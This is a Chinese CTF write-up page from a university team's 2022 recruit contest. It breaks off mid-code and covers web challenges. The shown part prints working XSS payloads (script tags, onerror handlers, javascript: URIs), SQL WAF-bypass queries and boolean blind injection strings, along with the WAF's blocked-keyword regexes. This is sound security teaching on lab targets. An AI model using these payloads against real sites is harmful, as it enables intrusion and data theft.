@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"c-a-t-nust.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="这里是南京理工大学 C.A.T. 战队2022年招新赛的 Writeup。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="南京理工大学2022萌新杯">
+<meta property="og:url" content="https://c-a-t-nust.github.io/p/d103d518.html">
+<meta property="og:site_name" content="C.A.T. Team">
+<meta property="og:description" content="这里是南京理工大学 C.A.T. 战队2022年招新赛的 Writeup。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20221014200004645.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20221014200240493.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20221014200445342.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20221014200714814.png">
+<meta property="article:published_time" content="2022-10-13T15:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-14T11:03:10.622Z">
+<meta property="article:author" content="C.A.T.">
+<meta property="article:tag" content="南京理工大学萌新杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c-a-t-nust.github.io/images/image-20221014200004645.png">
+
+
+<link rel="canonical" href="https://c-a-t-nust.github.io/p/d103d518.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://c-a-t-nust.github.io/p/d103d518.html","path":"p/d103d518.html","title":"南京理工大学2022萌新杯"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>南京理工大学2022萌新杯 | C.A.T. Team</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">C.A.T. Team</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SignIn"><span class="nav-number">1.1.</span> <span class="nav-text">SignIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8192"><span class="nav-number">1.2.</span> <span class="nav-text">8192</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951"><span class="nav-number">1.2.1.</span> <span class="nav-text">解法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952"><span class="nav-number">1.2.2.</span> <span class="nav-text">解法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">1.3.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">解法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">解法2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%953"><span class="nav-number">1.3.3.</span> <span class="nav-text">解法3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">第一关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">第二关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">第三关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">第四关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">第五关</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabySQL"><span class="nav-number">1.4.</span> <span class="nav-text">BabySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">解法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">解法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Typing"><span class="nav-number">1.5.</span> <span class="nav-text">Typing</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-babystack"><span class="nav-number">2.1.</span> <span class="nav-text">0x1 babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-just-rce"><span class="nav-number">2.2.</span> <span class="nav-text">0x2 just_rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-easystack"><span class="nav-number">2.3.</span> <span class="nav-text">0x3 easystack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vigen"><span class="nav-number">3.1.</span> <span class="nav-text">Vigen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-fence-called-caesar"><span class="nav-number">3.2.</span> <span class="nav-text">A-fence-called-caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strange-text"><span class="nav-number">3.3.</span> <span class="nav-text">strange-text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezRSA"><span class="nav-number">3.4.</span> <span class="nav-text">ezRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hardRSA"><span class="nav-number">3.5.</span> <span class="nav-text">hardRSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyIDA"><span class="nav-number">4.1.</span> <span class="nav-text">easyIDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virus"><span class="nav-number">4.2.</span> <span class="nav-text">virus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyPatch"><span class="nav-number">4.3.</span> <span class="nav-text">easyPatch</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-misc"><span class="nav-number">5.1.</span> <span class="nav-text">hello_misc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-social-work"><span class="nav-number">5.2.</span> <span class="nav-text">hello_social_work</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-encrypted-zip"><span class="nav-number">5.3.</span> <span class="nav-text">hello_encrypted_zip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-encrypted-zip"><span class="nav-number">5.4.</span> <span class="nav-text">ez_encrypted_zip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-misc"><span class="nav-number">5.5.</span> <span class="nav-text">ez_misc</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">C.A.T.</p>
+  <div class="site-description" itemprop="description">C.A.T. Team</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://c-a-t-nust.github.io/p/d103d518.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="C.A.T.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C.A.T. Team">
+      <meta itemprop="description" content="C.A.T. Team">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="南京理工大学2022萌新杯 | C.A.T. Team">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          南京理工大学2022萌新杯
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-13 星期四 23:00:00" itemprop="dateCreated datePublished" datetime="2022-10-13T23:00:00+08:00">2022-10-13 星期四</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-09-14 星期六 19:03:10" itemprop="dateModified" datetime="2024-09-14T19:03:10+08:00">2024-09-14 星期六</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>这里是南京理工大学 C.A.T. 战队2022年招新赛的 Writeup。</p>
+<span id="more"></span>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>Web 题的第一步是信息搜集，首先 F12 查看网页源代码发现第一段 flag：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span>You find the first part: njustCTF&#123;11b12<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用 dirsearch 扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/.index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p>先看一下 <code>robots.txt</code>，里面内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">/her3_1s_5econd_pa1t.html</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/her3_1s_5econd_pa1t.html</code>，我们就能拿到 flag 的第二部分了。</p>
+<p>最后把 <code>/.index.php.swp</code> 下载到本地，发现里面有这么一段代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The last one: fb35174c0891b&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 flag 第三部分，拼起来就是最终的 flag 了。</p>
+<blockquote>
+<p>index.html 是常见的主页文件</p>
+<p>.index.php.swp 是 vim 编辑文件后的缓存文件</p>
+<p>robots.txt 告诉搜索引擎哪些文件希望让爬虫获取哪些不希望让它获取</p>
+</blockquote>
+<h2 id="8192"><a href="#8192" class="headerlink" title="8192"></a>8192</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>玩到 8192，不过这不是一般人能玩到的数值，除非你能整个 AI 帮你跑。</p>
+<p>就连觉得 2048 很简单的 regod KM 学长都觉得困难。</p>
+<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>可能会尝试抓包，然后发现并没有什么网络请求，得知为纯前端。</p>
+<p>然后有几种思路，直接搜索数值 8192 相关的，能发现有个 <code>self.won = true;</code> 的标识符，再根据这个去查找能很快找到字符串。</p>
+<p>或者是故意玩输，去查找失败弹出的提示，再去搜索失败有关的字符串。</p>
+<p>抑或是做过有关的小游戏，直接搜索 <code>alert</code>（这个我本来打算用自带的显示，发现显示框小了就算了）</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a>解法1</h3><p>观察 url，发现每过一关 level 会加 1，可以直接跳关。</p>
+<h3 id="解法2-1"><a href="#解法2-1" class="headerlink" title="解法2"></a>解法2</h3><p>这个的本质是重写了当前页面的 <code>alert</code> 函数。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_alert = alert;</span><br><span class="line">alert = <span class="keyword">function</span>(<span class="params">info</span>)&#123;</span><br><span class="line">    <span class="title function_">_alert</span>(<span class="string">&quot;过关成功！进入下一关！&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> current_level = location.<span class="property">pathname</span>.<span class="title function_">match</span>(<span class="regexp">/level([0-9]+)/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> next_level = <span class="built_in">parseInt</span>(current_level) + <span class="number">1</span>;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;/level&quot;</span> + next_level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以还有种逃课解法是直接在控制台调用 <code>alert</code> 函数。</p>
+<h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h3><p>观前说明：本题 payload 不唯一。</p>
+<h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>观察到 url 中有 <code>?username=xss</code>，而网页中正好存在 <code>welcome xss</code>，猜测是直接替换。</p>
+<p>payload： <code>level1?username=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>查看网页源代码后发现 <code>document.getElementById(&#39;ccc&#39;).innerHTML= &quot;Welcome &quot; + escape(username);</code>。</p>
+<p>而 <code>username</code> 定义时如果字符串中有 <code>/</code> 就会报错，于是想到注入点可以在变量定义那里 <code>var username = &#39;xss&#39;;</code>，闭合语句即可。</p>
+<p>payload：<code>level2?username=&#39;;alert(1);//</code>，变量定义的语句变为 <code>var username = &#39;&#39;;alert(1);//&#39;;</code>。</p>
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>观察网页源代码，发现字符都被转义了。</p>
+<p>写入标签 <code>level3?username=&lt;img src=233 onerror=alert(1)&gt;</code></p>
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>发现是自动跳转的网页，源代码里发现注入点是 <code>jumpUrl</code>，使用 JavaScript 伪协议来实现。</p>
+<p>payload：<code>level4?jumpUrl=javascript:alert(1)</code></p>
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>观察源代码发现有 <code>autosubmit</code> <code>action</code> 两个参数，其中需要我们把 <code>autosubmit</code> 置 1，然后会跳转到 <code>action</code> 参数的链接。</p>
+<p>比方说，有 <code>level5?autosubmit=1&amp;action=233</code>，网站会跳转到 <code>/233</code> 上去。</p>
+<p>于是再用 JavaScript 伪协议，得到 payload：<code>level5?autosubmit=1&amp;action=javascript:alert(1)</code></p>
+<h2 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h2><h3 id="解法1-2"><a href="#解法1-2" class="headerlink" title="解法1"></a>解法1</h3><p>题目提示 admin 的密码，可以尝试弱密码直接登录，然后跳转到 <code>/query.php</code>（或者你字典够强，直接找到了也行，谁能想到出题人这么懒都没写 session 呢）。</p>
+<p>有一个输入框能让你输 SQL 语句，发现小写的被 ban 了。注意到 SQL 语句是大小写不敏感的，直接将关键词替换为大写即可。</p>
+<p>由于是直接输查询语句，所以 <code>show</code> 也是能用的。</p>
+<p>一种解法（不过我没怎么用过 show，不知道为啥只显示了一个表）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> tables</span><br><span class="line"><span class="comment">-- array(2) &#123; [0]=&gt; string(35) &quot;Flllllllllllllaaaaaaaaaaaaagggggggg&quot; [&quot;Tables_in_ctf&quot;]=&gt; string(35) &quot;Flllllllllllllaaaaaaaaaaaaagggggggg&quot; &#125;</span></span><br><span class="line"><span class="keyword">SHOW</span> columns <span class="keyword">FROM</span> Flllllllllllllaaaaaaaaaaaaagggggggg</span><br><span class="line"><span class="comment">-- array(12) &#123; [0]=&gt; string(13) &quot;ffffffflagggg&quot; [&quot;Field&quot;]=&gt; string(13) &quot;ffffffflagggg&quot; [1]=&gt; string(12) &quot;varchar(200)&quot; [&quot;Type&quot;]=&gt; string(12) &quot;varchar(200)&quot; [2]=&gt; string(2) &quot;NO&quot; [&quot;Null&quot;]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [&quot;Key&quot;]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [&quot;Default&quot;]=&gt; NULL [5]=&gt; string(0) &quot;&quot; [&quot;Extra&quot;]=&gt; string(0) &quot;&quot; &#125;</span></span><br><span class="line"><span class="keyword">SELECT</span> ffffffflagggg <span class="keyword">FROM</span> Flllllllllllllaaaaaaaaaaaaagggggggg</span><br><span class="line"><span class="comment">-- array(2) &#123; [0]=&gt; string(42) &quot;njustCTF&#123;ac5c74b64b4b8352ef2f181affb5ac2a&#125;&quot; [&quot;ffffffflagggg&quot;]=&gt; string(42) &quot;njustCTF&#123;ac5c74b64b4b8352ef2f181affb5ac2a&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>不过在联合查询中，比较常用的有 <code>information_schema.schemata</code> <code>information_schema.tables</code> <code>information_schema.columns</code> 等内置表。</p>
+<p>于是有：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(TABLE_NAME) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA<span class="operator">=</span>database()</span><br><span class="line"><span class="comment">-- array(2) &#123; [0]=&gt; string(42) &quot;Flllllllllllllaaaaaaaaaaaaagggggggg,PERSON&quot; [&quot;group_concat(TABLE_NAME)&quot;]=&gt; string(42) &quot;Flllllllllllllaaaaaaaaaaaaagggggggg,PERSON&quot; &#125;</span></span><br><span class="line"><span class="keyword">SELECT</span> group_concat(COLUMN_NAME) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;Flllllllllllllaaaaaaaaaaaaagggggggg&#x27;</span></span><br><span class="line"><span class="comment">-- array(2) &#123; [0]=&gt; string(13) &quot;ffffffflagggg&quot; [&quot;group_concat(COLUMN_NAME)&quot;]=&gt; string(13) &quot;ffffffflagggg&quot; &#125;</span></span><br><span class="line"><span class="keyword">SELECT</span> ffffffflagggg <span class="keyword">FROM</span> Flllllllllllllaaaaaaaaaaaaagggggggg</span><br><span class="line"><span class="comment">-- array(2) &#123; [0]=&gt; string(42) &quot;njustCTF&#123;ac5c74b64b4b8352ef2f181affb5ac2a&#125;&quot; [&quot;ffffffflagggg&quot;]=&gt; string(42) &quot;njustCTF&#123;ac5c74b64b4b8352ef2f181affb5ac2a&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>附上 waf：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/drop|delete|truncate|insert|into|create|use|declare|set/i&quot;</span>, <span class="variable">$username</span>) <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/drop|delete|truncate|insert|into|create|use|declare|set/i&quot;</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;what do you want to do?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/tables|select|union|from|where|\/|&lt;|=/&quot;</span>, <span class="variable">$username</span>) <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/tables|select|union|from|where|\/|&lt;|=/&quot;</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;you are hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// query.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/drop|delete|truncate|insert|into|create|use|declare|set/i&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;what do you want to do?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|union|from|where|\/|&lt;|\*/&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解法2-2"><a href="#解法2-2" class="headerlink" title="解法2"></a>解法2</h3><p>其实可以直接在登录界面进行布尔盲注。</p>
+<p>观察登录返回情况，存在 username wrong 和 password wrong，于是可以考虑以此作为参考进行布尔盲注。</p>
+<p>即如果 username 注入成功，返回即为 password wrong，反之则为 username wrong。</p>
+<p>最简单的等于和小于测定被ban了，但还有一个大于。</p>
+<p>POST以下数据：<code>username=admin&#39; AND 2&gt;1 -- &amp;password=233</code>发现返回password wrong。</p>
+<p><code>username=admin&#39; AND 2&gt;3 -- &amp;password=233</code>发现返回username wrong。</p>
+<p>至此，理论基础存在，比如你可以用  <code>username=admin&#39; AND length(database())&gt;3 -- &amp;password=233</code> 这类语句得知当前数据库名长度为3。</p>
+<p><code>username=admin&#39; AND ascii(substr(database(),1,1))&gt;99 -- &amp;password=233</code> 得知数据库名第一个字符为 <code>c</code>。</p>
+<p>以此类推得到数据库名为 <code>ctf</code>。</p>
+<p>小写 tables 和等号被 ban 了，采用大写和 LIKE 语句绕过。</p>
+<p><code>username=admin&#39; AND (SELECT count(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE &#39;ctf&#39;)&gt;1 -- &amp;password=233</code></p>
+<p>得到只有2个表，其实就是 <code>PERSON</code> 表和 <code>Flllllllllllllaaaaaaaaaaaaagggggggg</code></p>
+<p>使用 <code>LIMIT</code> 限定一下就行。</p>
+<p><code>username=admin&#39; AND length(substr((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE &#39;ctf&#39; LIMIT 0,1),1))&gt;34 -- &amp;password=233</code> 得到表名长度为35。</p>
+<p><code>username=admin&#39; AND ascii(substr((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE &#39;ctf&#39; LIMIT 0,1),1,1))&gt;70 -- &amp;password=233</code> 得到表的第一个字符为 <code>F</code>。</p>
+<p>以此类推得到表名为 <code>Flllllllllllllaaaaaaaaaaaaagggggggg</code>。</p>
+<p>如法炮制得到列名和最后的 flag。</p>
+<p>中间都是使用脚本跑的，不过我懒得写了（</p>
+<h2 id="Typing"><a href="#Typing" class="headerlink" title="Typing"></a>Typing</h2><p>进行了简单的 js 混淆，关键函数名都没替换。</p>
+<p>如果熟悉 js 的同学，可以在混淆后的代码简单格式化后进行快速替换。</p>
+<p>替换完就得到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 